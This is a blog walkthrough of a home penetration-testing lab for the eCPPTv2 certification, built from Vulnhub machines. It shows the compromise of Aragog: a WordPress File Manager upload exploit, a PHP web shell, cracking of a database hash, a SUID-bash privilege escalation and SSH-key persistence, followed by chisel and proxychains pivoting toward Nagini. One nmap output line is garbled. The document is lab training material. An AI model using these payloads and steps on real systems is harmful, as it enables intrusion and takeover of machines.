---
title: eCPPTv2 - Home Laboratory
date: 2023-06-09
categories: [Certifications, eCPPTv2]
tags: [Linux, Windows, Pivoting, BufferOverflow]
---

![](/assets/img/eCPPTv2/eCPPTv2.png)

---

Welcome! Today we are going to be solving the `eCPPTv2` homelab, which we'll set up with **free** `Vulnhub` machines. This lab consists on 4 **Linux** machines and 2 **Windows** machines. These machenes are connected each other in a scpecific way: the first machine has two network interfaces, one (wlan0 -> or attacker inteface) and the other one, (vboxnet0), which is connected to the next machine. You have this same lab in a [video](https://www.youtube.com/watch?v=Q7UeWILja-g&ab_channel=S4viOnLive%28BackupDirectosdeTwitch%29) by [s4vitar](https://www.youtube.com/@s4vitar). Thanks to `s4vitar` for giving us this awsome lab!!
Machines:

- [Aragog](https://www.vulnhub.com/entry/harrypotter-aragog-102,688/)
- [Nagini](https://www.vulnhub.com/entry/harrypotter-nagini,689/)
- [Fawkes](https://www.vulnhub.com/entry/harrypotter-fawkes,686/)
- [Dumbledore-PC](https://archive.org/details/Windows7Professional64Bit)
- [Matrix 1](https://www.vulnhub.com/entry/matrix-1,259/)
- [Brainpan 1](https://www.vulnhub.com/entry/brainpan-1,51/)

The explanation of how to set up all the lab is pretty long so you can go to the `s4vitar` video and set up everything.

# Aragog
---

![](/assets/img/eCPPTv2/aragog.png)

---

## Enumeration
---

### Target identification
---

This machine is connected to our network interface so we can see its IP easily:

```zsh
❯ arp-scan -I wlan0 --ignoredups --localnet
Interface: wlan0, type: EN10MB, MAC: 3c:a0:67:42:9b:ce, IPv4: 192.168.0.111
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.0.1	ac:84:c6:d2:37:b2	TP-LINK TECHNOLOGIES CO.,LTD.
192.168.0.10	f4:4d:30:92:f9:65	Elitegroup Computer Systems Co.,Ltd.
192.168.0.114	08:00:27:1c:69:5d	PCS Systemtechnik GmbH
192.168.0.101	7c:2f:80:ed:0c:de	Gigaset Communications GmbH
192.168.0.110	ce:32:82:b4:66:58	(Unknown: locally administered)

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.076 seconds (123.31 hosts/sec). 5 responded
```

Perfect, so our target is **192.168.0.114**. To know what **OS** are we trying to vulnerate, we can use the tool [whichSystem.py](https://pastebin.com/HmBcu7j2). This tool execute a `ping` command against the given IP and basing on the `TTL` (Time to live), it will report if is a **Linux** system or a **Windows** system:

```zsh
❯ whichSystem 192.168.0.114

192.168.0.114 (ttl -> 64): Linux
```

Here we can see that the `TTL` has a value of 64, so thanks to that we can know that is a **Linux** machine.

### Nmap
---

Let's run our `nmap` scan as in all machines:

```zsh
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.0.114 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 15:46 CEST
Initiating ARP Ping Scan at 15:46
Scanning 192.168.0.114 [1 port]
Completed ARP Ping Scan at 15:46, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:46
Scanning 192.168.0.114 [65535 ports]
Discovered open port 22/tcp on 192.168.0.114
Discovered open port 80/tcp on 192.168.0.114
Completed SYN Stealth Scan at 15:46, 1.23s elapsed (65535 total ports)
Nmap scan report for 192.168.0.114
Host is up, received arp-response (0.00030s latency).
Scanned at 2023-06-05 15:46:57 CEST for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:1C:69:5D (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Great, now, with `extractPorts`...

```bash
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	batcat extractPorts.tmp
	rm extractPorts.tmp
}
```

We can extract the relevant info thanks to the regular expressions:

```zsh
❯ extractPorts allPorts

    [*] Extracting information...

        [*] IP Address: 192.168.0.114
        [*] Open ports: 22,80

    [*] Ports copied to clipboard
```

Nice. Now we can perform a deeper scan with `nmap`:

```zsh
❯ nmap -sCV -p22,80 192.168.0.114 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 202`0.114)
Host is up (0.00038s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 48df48372594c4746b2c6273bfb49fa9 (RSA)
|   256 1e3418175e17958f702f80a6d5b4173e (ECDSA)
|_  256 3e795f55553b127596b43ee3837a5494 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:1C:69:5D (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds
```

Great, here we can see the versions of each service.

### Gobuster
---

Gobuster is a tool coded in `go` which allows us to enumerate subdomains, directories of a web, and a large number of more things. In this case, we're going to use it to enumerate directories. For that we'll use the command `dir`:

```zsh
❯ gobuster dir -u http://192.168.0.114 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 60
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.114
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/05 15:53:08 Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 319] [--> http://192.168.0.114/javascript/]
/blog                 (Status: 301) [Size: 313] [--> http://192.168.0.114/blog/]
Progress: 29667 / 220561 (13.45%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/06/05 15:53:15 Finished
===============================================================
```

Ok, here we can see a `/blog` directory. Let's access it!

## Foothold
---

By accessing the web we can see that is running a `wordpress` service:

![](/assets/img/eCPPTv2/1.png)

### WP-Scan
---

`wp-scan` is a tool focused on wordpress enumeration, such as vulnerable plugins and more. For this case we'll need to use the **API**, so the only thing you need to do is to go to [register](https://wpscan.com/register) and then in profile, search for `api token`. Then, export it into a system variable.

```zsh
❯ wpscan --url http://192.168.0.114/blog/ --enumerate u,vp --plugins-detection aggressive --api-token=$WPTOKEN
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.0.114/blog/ [192.168.0.114]
[+] Started: Mon Jun  5 15:59:23 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.0.114/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.0.114/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.0.114/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0.12 identified (Insecure, released on 2021-04-14).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.0.114/blog/, Match: '-release.min.js?ver=5.0.12'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.0.114/blog/, Match: 'WordPress 5.0.12'
 |
 | [!] 28 vulnerabilities identified:
 |
 | [!] Title: File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE
 |     Fixed in: 6.9
 |     References:
 |      - https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25213
 |      - https://blog.nintechnet.com/critical-zero-day-vulnerability-fixed-in-wordpress-file-manager-700000-installations/
 |      - https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/
 |      - https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/
 |      - https://blog.sucuri.net/2020/09/critical-vulnerability-file-manager-affecting-700k-wordpress-websites.html
 |      - https://twitter.com/w4fz5uck5/status/1298402173554958338
 |
 | [!] Title: WP File Manager < 7.1 - Reflected Cross-Site Scripting (XSS)
 |     Fixed in: 7.1
 |     References:
 |      - https://wpscan.com/vulnerability/1cf3d256-cf4b-4d1f-9ed8-e2cc6392d8d8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24177
 |      - https://n4nj0.github.io/advisories/wordpress-plugin-wp-file-manager-i/
 |      - https://plugins.trac.wordpress.org/changeset/2476829/
 |
 | Version: 6.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.0.114/blog/wp-content/plugins/wp-file-manager/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.0.114/blog/wp-content/plugins/wp-file-manager/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] wp-admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 22

[+] Finished: Mon Jun  5 15:59:38 2023
[+] Requests Done: 5746
[+] Cached Requests: 8
[+] Data Sent: 1.578 MB
[+] Data Received: 936.626 KB
[+] Memory used: 200.516 MB
[+] Elapsed time: 00:00:15
```

## Shell - www-data
---

This is a pretty large output, but we only need to focus on `File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE`. As we can see, this tool is providing us a link to the [exploit](https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py). Let's download it and see what it does:

![](/assets/img/eCPPTv2/2.png)

Here we can see that the exploit is calling to a `php` file, so let's create one:

```php
<?php
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

This script will allow us to execute commands on the server using the `GET` request method:

```zsh
❯ python3 exploit.py http://192.168.0.114/blog
Just do it... URL: http://192.168.0.114/blog/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
200
Success!?
http://192.168.0.114/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php
```

Ok, so it seems like this was successful. Let's open the given link:

![](/assets/img/eCPPTv2/3.png)

All right! We have `RCE` on this first victim machine! Let's check some network interfaces:

![](/assets/img/eCPPTv2/4.png)

Damn! So we can see that this machine has **TWO** network interfaces, which means that maeby, there are more computers connected to that network interface.
First, let's gain a shell to the `Aragog` machine:

![](/assets/img/eCPPTv2/5.png)

Ok, I've already explained this in other machines, so I'm not going to explain it again.
As we can see, in our `netcat` listener we've gained a reverse shell!

![](/assets/img/eCPPTv2/6.png)

## Lateral Movement - hagrid98
---

By enumerating files on the system we can notice about a file on `/etc/wordpress` that contains `mysql` credentials:

```zsh
www-data@Aragog:/etc/wordpress$ ls
config-default.php  htaccess
www-data@Aragog:/etc/wordpress$ cat config-default.php
<?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'mySecr3tPass');
define('DB_HOST', 'localhost');
define('DB_COLLATE', 'utf8_general_ci');
define('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');
?>
www-data@Aragog:/etc/wordpress$ mysql -uroot -pmySecr3tPass
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 36
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases
    -> ;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
4 rows in set (0.003 sec)

MariaDB [(none)]> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
| wp_wpfm_backup        |
+-----------------------+
13 rows in set (0.001 sec)

MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email               | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | hagrid98   | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin      | hagrid98@localhost.local |          | 2021-03-31 14:21:02 |                     |           0 | WP-Admin     |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.001 sec)

MariaDB [wordpress]> 
```

Ok, here we are seeing a hash for the `hagrid98` user. We can try to crack it:

```zsh
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Created directory: /home/ruy/.john
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)     
1g 0:00:00:00 DONE (2023-06-05 16:28) 11.11g/s 17066p/s 17066c/s 17066C/s 753951..mexico1
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 
```

Ok, so here we are able to see the password **password123**, a very strong password XD... Well, having a password and a user, we can try to connect via `ssh`:

```zsh
❯ ssh hagrid98@192.168.0.114
hagrid98@192.168.0.114's password: 
Linux Aragog 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jun  5 01:36:01 2023 from 192.168.0.111
hagrid98@Aragog:~$ export TERM=xterm-256color
hagrid98@Aragog:~$ export SHELL=/bin/bash
hagrid98@Aragog:~$ bash
hagrid98@Aragog:~$ 
```

## Privilege escalation
---

By listing `SUID` binaries we can see that there isn't much thing, but when we list for files that our user can read we got some interesting things:

```bash
hagrid98@Aragog:~$ find / \-user hagrid98 2>/dev/null
**truncated**
/opt/.backup.sh
```

If we do `ls -l` to this file we can see that we have **writing** permissions, so we could load an instruction and this instruction will be executed by root:

```bash
#!/bin/bash

chmod u+s /bin/bash
```

Now, we just need to wait until the `bash` gets `SUID` permissions:

```bash
hagrid98@Aragog:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
hagrid98@Aragog:~$ 
```

Perfect! Now we could simply do `bash -p` (p -> privileged) and we'll got a `bash` as root:

```bash
hagrid98@Aragog:~$ bash -p
bash-5.0# whoami
root
bash-5.0# 
```

## Establishing persistence (Aragog)
---

In this lab there are several machines, so its more comfortable to have dircet connectivity to a machine as root. To do that, we just need to generate a public key with `ssh-keygen` and add it into `/root/.ssh/authorized_keys` of the `Aragog` machine. After doing this, we'll get direct access as root to the `Aragog` machine:

```zsh
❯ ssh root@192.168.0.114
Linux Aragog 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jun  5 02:27:39 2023 from 192.168.0.111
root@Aragog:~# whoami
root
root@Aragog:~# 
```

# Nagini 
---

![](/assets/img/eCPPTv2/nagini.png)

---

## Tunnelling interface `vboxnet0` to `wlan0`
---

By running `ip a` command we can see that `Aragog` machine is connected to **other** network interface:

```zsh
root@Aragog:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:1c:69:5d brd ff:ff:ff:ff:ff:ff
    inet 192.168.0.114/24 brd 192.168.0.255 scope global dynamic enp0s3
       valid_lft 1071sec preferred_lft 1071sec
    inet6 fe80::a00:27ff:fe1c:695d/64 scope link 
       valid_lft forever preferred_lft forever
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:8c:b1:4a brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.6/24 brd 192.168.56.255 scope global dynamic enp0s8
       valid_lft 548sec preferred_lft 548sec
    inet6 fe80::a00:27ff:fe8c:b14a/64 scope link 
       valid_lft forever preferred_lft forever
root@Aragog:~# 
```

We are root in this machine, so we can install `arp-scan` to see which devices are connected to this interface:

```zsh
root@Aragog:~# apt install arp-scan
Reading package lists... Done
Building dependency tree       
Reading state information... Done
arp-scan is already the newest version (1.9.5-1).
The following packages were automatically installed and are no longer required:
  distro-info-data lsb-release
Use 'apt autoremove' to remove them.
0 upgraded, 0 newly installed, 0 to remove and 134 not upgraded.
root@Aragog:~# arp-scan -I enp0s8 --ignoredups --localnet
Interface: enp0s8, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	0a:00:27:00:00:00	(Unknown)
192.168.56.2	08:00:27:16:ea:fa	Cadmus Computer Systems
192.168.56.7	08:00:27:76:5a:8f	Cadmus Computer Systems

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.5: 256 hosts scanned in 2.090 seconds (122.49 hosts/sec). 3 responded
root@Aragog:~# ping -c 1 192.168.56.7
PING 192.168.56.7 (192.168.56.7) 56(84) bytes of data.
64 bytes from 192.168.56.7: icmp_seq=1 ttl=64 time=0.581 ms

--- 192.168.56.7 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.581/0.581/0.581/0.000 ms
root@Aragog:~# 
```

Here we can see the `Nagini`'s IP (192.168.56.7). You may wander how could we do to transfer the whole network interface so we can access it from our attacker machine? Well, this is pretty easy, we just need to install [chisel](https://github.com/jpillora/chisel) and execute some commands:

- On our attacker machine:

```zsh
❯ chisel server --reverse -p 9001
2023/06/05 17:14:58 server: Reverse tunnelling enabled
2023/06/05 17:14:58 server: Fingerprint Xvp7hnFXSDzIR9xapCeoyJyV3skTI1+Aisq6x3qBX5Q=
2023/06/05 17:14:58 server: Listening on http://0.0.0.0:9001
```

- On `Aragog` machine:

```bash
root@Aragog:~# ./chisel client 192.168.0.111:9001 R:socks
2023/06/05 20:45:39 client: Connecting to ws://192.168.0.111:9001
2023/06/05 20:45:39 client: Connected (Latency 1.233517ms)
```

Perfect! In our `chisel` server we can see that a socks `proxy` has been stablished on port **1080**:

![](/assets/img/eCPPTv2/7.png)

Now, we are going to use the tool `proxychains` to successfully have whole access to that interface. To achieve that, we need to edit the `/etc/proxychains.conf` file. This is how it should look like:

```zsh
# proxychains.conf  VER 3.1
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#       

# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
# otherwise the last appearing option will be accepted
#
#dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#
#random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see  chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain
#chain_len = 2

# Quiet mode (no output from library)
#quiet_mode

# Proxy DNS requests - no leak for DNS data
proxy_dns

# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000

# ProxyList format
#       type  host  port [user pass]
#       (values separated by 'tab' or 'blank')
#
#
#        Examples:
#
#               socks5  192.168.67.78   1080    lamer   secret
#               http    192.168.89.3    8080    justu   hidden
#               socks4  192.168.1.49    1080
#               http    `192.168.39.93   8080    
#               
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050

socks5 127.0.0.1 1080
``` 

Now we can try to `ping` the machine using `proxychains`:

```zsh
❯ proxychains ping -c 1 192.168.56.7 2>/dev/null
PING 192.168.56.7 (192.168.56.7) 56(84) bytes of data.
64 bytes from 192.168.56.7: icmp_seq=1 ttl=64 time=0.769 ms

--- 192.168.56.7 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.769/0.769/0.769/0.000 ms
```

Perfect!! We are able to access this network interface!

## Enumeration
---

### Nmap
---

As we did before, we are going to enumerate the opened ports with `nmap`:

```zsh
❯ proxychains nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.56.7 -oG allPorts 2>/dev/null
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 17:23 CEST
Initiating ARP Ping Scan at 17:23
Scanning 192.168.56.7 [1 port]
Completed ARP Ping Scan at 17:23, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:23
Scanning 192.168.56.7 [65535 ports]
Discovered open port 22/tcp on 192.168.56.7
Discovered open port 80/tcp on 192.168.56.7
Completed SYN Stealth Scan at 17:23, 1.29s elapsed (65535 total ports)
Nmap scan report for 192.168.56.7
Host is up, received arp-response (0.00014s latency).
Scanned at 2023-06-05 17:23:01 CEST for 2s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:76:5A:8F (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.53 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Same procedure as always:

```zsh
❯ proxychains nmap -sCV -p22,80 192.168.56.7 -oN targeted 2>/dev/null
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 17:23 CEST
Nmap scan report for 192.168.56.7
Host is up (0.00021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 48df48372594c4746b2c6273bfb49fa9 (RSA)
|   256 1e3418175e17958f702f80a6d5b4173e (ECDSA)
|_  256 3e795f55553b127596b43ee3837a5494 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:76:5A:8F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.37 seconds
```

### Gobuster
---

This tool has an integrated parameter to use proxys, so instead of using `proxychains` we are going to use the native parameter of `gobuster`:

```zsh
❯ gobuster dir -u http://192.168.56.7 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 60 -x php,txt,zip --proxy socks5://127.0.0.1:1080
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.7
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   socks5://127.0.0.1:1080
[+] User Agent:              gobuster/3.5
[+] Extensions:              zip,php,txt
[+] Timeout:                 10s
===============================================================
2023/06/05 17:25:40 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/note.txt             (Status: 200) [Size: 234]
/joomla               (Status: 301) [Size: 313] [--> http://192.168.56.7/joomla/]
Progress: 104268 / 882244 (11.82%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/06/05 17:27:00 Finished
===============================================================
```

## Foothold
---

Perfect, here we can see some directories, but `/note.txt` is obviously interesting, so let's check it:

>**Note:** To successfully access the `Nagini` web you need to create a `proxy` with `FoxyProxy` like this:

![](/assets/img/eCPPTv2/8.png)

Now we can access the web:

![](/assets/img/eCPPTv2/9.png)

Here we can see that the message is talking about an `HTTP3` server:

![](/assets/img/eCPPTv2/10.png)

We can see that this service runs in port 443/**udp**, so we can port-forward that port with `chisel`:

```zsh
root@Aragog:~# ./chisel client 192.168.0.111:9001 R:socks R:443:192.168.56.7:443/udp
2023/06/05 21:08:25 client: Connecting to ws://192.168.0.111:9001
2023/06/05 21:08:25 client: Connected (Latency 1.662443ms)
```

And, in our `chisel` server we can see that the port has been successfully forwarded:

```zsh
❯ chisel server --reverse -p 9001
2023/06/05 17:36:57 server: Reverse tunnelling enabled
2023/06/05 17:36:57 server: Fingerprint ra5nC39y+wMdPT+Sb+j6AGoRLhAKvVCKMgpXIfC2B8U=
2023/06/05 17:36:57 server: Listening on http://0.0.0.0:9001
2023/06/05 17:38:21 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2023/06/05 17:38:21 server: session#1: tun: proxy#R:443=>192.168.56.7:443/udp: Listening
```

### Installing quiche
---

To enumerate the `http3` service we need to install the tool `quiche`:

```bash
git clone --recursive https://github.com/cloudflare/quiche
cd quiche/
sudo apt install cargo
sudo apt remove rustc
curl https://sh.rustup.rs -sSf | sh
source "$HOME/.cargo/env"
rustup update
cargo build --examples
cargo test
```

```zsh
❯ cd target/debug/examples
                                                                                                                                                                                                                                
❯ ls
client                     http3-client                     http3-server                     qpack-decode                     qpack-encode                     server
client-88c4d6c1cc6733a9    http3_client-4489526c2d526d3b    http3_server-03127591f718ba67    qpack_decode-1120bd6ede268e9d    qpack_encode-4b7cf6bb15984608    server-0bb2bd8383e2b445
client-88c4d6c1cc6733a9.d  http3_client-4489526c2d526d3b.d  http3_server-03127591f718ba67.d  qpack_decode-1120bd6ede268e9d.d  qpack_encode-4b7cf6bb15984608.d  server-0bb2bd8383e2b445.d
client.d                   http3_client-ab51fc5ff8db1790    http3_server-54ed3633ba05c412    qpack_decode-8c2499818e74165a    qpack_encode-5379e755771bd75b    server-41b396a38a3418bc
client-eee33b51ec96456a    http3_client-ab51fc5ff8db1790.d  http3_server-54ed3633ba05c412.d  qpack_decode-8c2499818e74165a.d  qpack_encode-5379e755771bd75b.d  server-41b396a38a3418bc.d
client-eee33b51ec96456a.d  http3-client.d                   http3-server.d                   qpack-decode.d                   qpack-encode.d                   server.d
                                                           
❯ ./http3-client https://127.0.0.1
<html>
	<head>
	<title>Information Page</title>
	</head>
	<body>
		Greetings Developers!!
		
		I am having two announcements that I need to share with you:

		1. We no longer require functionality at /internalResourceFeTcher.php in our main production servers.So I will be removing the same by this week.
		2. All developers are requested not to put any configuration's backup file (.bak) in main production servers as they are readable by every one.


		Regards,
		site_admin
	</body>
</html>
```

## SSRF - Fail
---

